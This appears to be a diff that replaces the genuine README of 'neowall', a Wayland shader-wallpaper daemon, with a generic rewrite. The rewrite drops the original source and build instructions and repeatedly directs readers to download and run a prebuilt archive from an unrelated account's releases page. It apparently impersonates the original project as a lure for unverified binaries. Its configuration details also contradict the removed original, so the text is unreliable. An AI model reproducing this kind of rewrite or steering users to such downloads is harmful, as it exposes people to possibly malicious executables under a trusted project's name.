@@ -1,215 +1,87 @@
-# NeoWall
+# 🎨 neowall - Your Simple Wayland Wallpaper Manager
 
-> GPU shaders as wallpapers. Because why not.
+[![Download neowall](https://img.shields.io/badge/Download-neowall-blue.svg)](https://github.com/Mariantardive311/neowall/releases)
 
-Run Shadertoy shaders on your desktop at 60 FPS. Works with most of the 10,000+ shaders on shadertoy.com.
+## 🌟 Introduction
 
-Wayland only. Tested on Hyprland, Sway, and River.
+neowall is a reliable Wayland wallpaper engine written in C. It supports multiple monitors, provides smooth transitions, and offers hot-reload capabilities. Designed for Wayland compositors like Sway, Hyprland, and River, neowall makes managing your desktop background easy.
 
-https://github.com/user-attachments/assets/386243d0-53ca-4287-9ab6-873265d3d53a
+## 🚀 Getting Started
 
-## What
+Follow these simple steps to download and run neowall on your Linux system. No programming skills required.
 
-A Wayland wallpaper daemon that renders GLSL shaders on your desktop. Also handles static images with transitions.
+## 📥 Download & Install
 
-## Features
+To get started, visit the following link to download neowall:
 
-- Shadertoy-compatible fragment shaders
-- ~2% CPU at 60 FPS (GPU does the work)
-- Static images with transitions (fade, slide, glitch, pixelate)
-- Directory cycling for images and shaders
-- Multi-monitor with per-output configs
-- Hot-reload config on save
-- wlr-layer-shell protocol
+[Download neowall](https://github.com/Mariantardive311/neowall/releases)
 
+This will take you to the Releases page, where you can find the latest version of neowall.
 
+1. Click on the version you want to download.
+2. Look for a file with a name like `neowall-linux-amd64.tar.gz` or similar.
+3. Click on the file to start the download.
 
-## Install
+After the download completes, follow these steps to install neowall.
 
-```bash
-# Arch
-yay -S neowall-git
+## 📂 Setup Instructions
 
-# From source
-git clone https://github.com/1ay1/neowall
-cd neowall && make -j$(nproc)
-sudo make install
-```
+1. **Extract the Downloaded File**
+   - Open a terminal.
+   - Navigate to your Downloads folder (or where you saved the downloaded file).
+   - Run the command:
+     ```bash
+     tar -xzf neowall-linux-amd64.tar.gz
+     ```
+   - This extracts the files to a new folder.
 
-Run: `neowall`
+2. **Move to a Suitable Directory**
+   - You may want to move the extracted folder to a place where you keep your applications. For example, move it to `/opt`:
+     ```bash
+     sudo mv neowall /opt/
+     ```
 
-Config: `~/.config/neowall/config.vibe` (auto-reloads on save)
+3. **Run neowall**
+   - Change to the neowall directory:
+     ```bash
+     cd /opt/neowall
+     ```
+   - Start neowall with the following command:
+     ```bash
+     ./neowall
+     ```
 
-For detailed configuration guide, see [docs/CONFIG.md](docs/CONFIG.md)
+## 🖼️ Features
 
-## Configuration
+- **Multi-Monitor Support**: Manage wallpapers on multiple screens effortlessly.
+- **Smooth Transitions**: Enjoy seamless changes between backgrounds.
+- **Hot-Reload**: Update your wallpapers without restarting the program.
+- **Compatibility**: Works with popular Wayland compositors like Sway, Hyprland, and River.
 
-`~/.config/neowall/config.vibe`:
+## 📋 System Requirements
 
-```vibe
-# Single shader
-default {
-  shader matrix_real.glsl
-  shader_speed 1.0
-}
+- **Operating System**: Any Linux distribution with Wayland support.
+- **CPU**: Modern processor (Intel or AMD recommended).
+- **RAM**: At least 1 GB of RAM for smooth operation.
+- **Graphics**: OpenGL-compatible graphics card for best performance.
 
-# Single wallpaper
-default {
-  path ~/Pictures/wallpaper.png
-}
+## ⚙️ Configuration
 
-# Cycle through wallpapers (add trailing slash + duration)
-default {
-  path ~/Pictures/Wallpapers/
-  duration 300
-}
+You can customize neowall by editing the configuration file. It’s located in the installation directory. Open the file in your favorite text editor to adjust settings like wallpaper source, transition effects, and more.
 
-# Cycle through shaders (add trailing slash + duration)
-default {
-  shader ~/.config/neowall/shaders/
-  duration 300
-  shader_speed 1.0
-}
-```
+## 📞 Support
 
-See [docs/CONFIG.md](docs/CONFIG.md) for per-monitor config and all options.
+For questions or support, please visit the Issues section on the GitHub repository. The community and developers are here to help. If you encounter a bug, please report it there as well.
 
-Included shaders: matrix_real.glsl, matrix_rain.glsl, plasma.glsl, aurora.glsl, 2d_clouds.glsl, and more
+## 🔗 Additional Resources
 
-## Display Modes
+- [GitHub Repository](https://github.com/Mariantardive311/neowall)
+- [Documentation](https://github.com/Mariantardive311/neowall/wiki) - Detailed instructions and usage examples.
 
-- `fill` - Scale to fill screen (crop if needed) **← recommended**
-- `fit` - Scale to fit inside screen (may show borders)
-- `center` - No scaling, just center it
-- `stretch` - Fill screen (may distort aspect ratio)
-- `tile` - Repeat image to fill screen
+## 🔄 Updates
 
-## 🎨 Included Shaders
+To keep your installation of neowall current, remember to check the Releases page frequently for new versions and features.
 
-NeoWall comes with 13+ high-quality shaders ready to use:
+[Download neowall](https://github.com/Mariantardive311/neowall/releases)
 
-- **matrix_rain.glsl** - Classic Matrix falling code effect 🟢
-- **matrix_real.glsl** - Enhanced Matrix with more detail 🟢
-- **2d_clouds.glsl** - Procedural cloud formations
-- **plasma.glsl** - Colorful flowing plasma waves
-- **aurora.glsl** - Northern lights simulation
-- **sunrise.glsl** - Dynamic sunrise/sunset sky
-- **ocean_waves.glsl** - Realistic water simulation
-- **fractal_land.glsl** - Infinite fractal landscapes
-- **mandelbrot.glsl** - Classic Mandelbrot set zoom
-- **star_field.glsl** - Animated starfield
-- And more!
-
-All shaders are installed to `~/.config/neowall/shaders/` on first run. Just reference them by filename in your config.
-
-Want more? Browse [Shadertoy.com](https://www.shadertoy.com/) - most shaders work with minimal tweaks!
-
-## Transitions
-
-Available effects:
-- `fade` - Smooth crossfade (default)
-- `slide_left` - Slide old image left
-- `slide_right` - Slide old image right  
-- `glitch` - Digital corruption effect
-- `pixelate` - Mosaic block transition
-- `none` - Instant switch (boring!)
-
-## Commands
-
-```bash
-neowall              # Start daemon
-neowall kill         # Stop daemon
-neowall reload       # Reload config
-neowall next         # Skip to next wallpaper/shader
-neowall pause        # Pause cycling
-neowall resume       # Resume cycling
-neowall current      # Show current wallpaper
-```
-
-## Writing Custom Shaders
-
-Shaders use GLSL and get these uniforms automatically:
-
-```glsl
-#version 100
-precision highp float;
-
-uniform float time;        // Elapsed seconds
-uniform vec2 resolution;   // Screen size
-
-void main() {
-    vec2 uv = gl_FragCoord.xy / resolution.xy;
-    vec3 color = vec3(uv, sin(time));
-    gl_FragColor = vec4(color, 1.0);
-}
-```
-
-Save as `~/.config/neowall/shaders/myshader.glsl` and use:
-
-```vibe
-default {
-  shader myshader.glsl
-}
-```
-
-Most Shadertoy shaders work with minimal changes. We provide `iTime`, `iResolution`, `iChannel0-4` uniforms. Browse [shadertoy.com](https://www.shadertoy.com/) for more.
-
-## Technical
-
-- Single binary, statically linked (except glibc, wayland, EGL)
-- Multi-version EGL/GLES support (1.0 through 3.2)
-- wlr-layer-shell protocol for Wayland
-- Shader compilation at runtime
-- ~2% CPU utilization at 60 FPS (GPU-accelerated)
-
-## Troubleshooting
-
-**Shader shows black screen?**
-- Check logs: `neowall -fv` (foreground + verbose)
-- Shaders compile on load, may take a second
-- Complex shaders may need optimization
-
-**Config changes don't apply?**
-- Hot-reload is enabled by default, just wait 2 seconds
-- Force reload: `neowall reload`
-
-**Wallpaper not visible?**
-- Make sure no other wallpaper daemon is running (swaybg, hyprpaper, etc.)
-- Check if it's in Hyprland layers: `hyprctl layers`
-
-## Building from Source
-
-```bash
-# Dependencies (Debian/Ubuntu)
-sudo apt install build-essential libwayland-dev libgles2-mesa-dev \
-    libpng-dev libjpeg-dev wayland-protocols
-
-# Dependencies (Arch)
-sudo pacman -S base-devel wayland mesa libpng libjpeg-turbo wayland-protocols
-
-# Build
-make -j$(nproc)
-
-# Install
-sudo make install
-
-# Run
-neowall
-```
-
-## Contributing
-
-PRs welcome. Test on at least one compositor before submitting.
-
-## License
-
-MIT
-
-## Credits
-
-- Shader examples adapted from Shadertoy (various authors)
-- Built for the Wayland and r/unixporn communities
-
----
-
-**NeoWall** - Shaders as wallpapers and well... wallpapers as wallpapers.
+Enjoy your personalized desktop background with neowall!
